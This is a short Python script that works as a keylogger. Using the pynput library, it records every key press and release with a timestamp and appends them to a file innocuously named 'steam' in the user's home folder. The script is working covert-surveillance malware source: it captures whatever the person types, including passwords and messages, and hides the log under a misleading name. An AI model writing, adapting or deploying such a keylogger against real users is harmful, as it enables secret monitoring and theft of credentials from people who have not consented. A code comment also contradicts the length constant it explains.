from pynput.keyboard import Listener
from pathlib import Path
from datetime import datetime

max_length = 17 # the longest keycode i could find was media_volume_down which is 21 characters long

def on_press(key):
    try:
        key_name = key.name
    except:
        key_name = key.char

    log = f"\n Pressed: {str(key_name).rjust(max_length)} | {datetime.now()}"

    file_path = Path.home() / "steam"
    file_path.parent.mkdir(parents=True, exist_ok=True)

    if not file_path.exists():
        file_path.write_text(log.lstrip("\n"))
    else:
        with file_path.open('a') as file:
            file.write(log)

def on_release(key):
    try:
        key_name = key.name
    except:
        key_name = key.char

    log = f"\nReleased: {str(key_name).rjust(max_length)} | {datetime.now()}"

    file_path = Path.home() / "steam"
    file_path.parent.mkdir(parents=True, exist_ok=True)

    if not file_path.exists():
        file_path.write_text(log.lstrip("\n"))
    else:
        with file_path.open('a') as file:
            file.write(log)

with Listener(on_press=on_press, on_release=on_release) as l:
    l.join()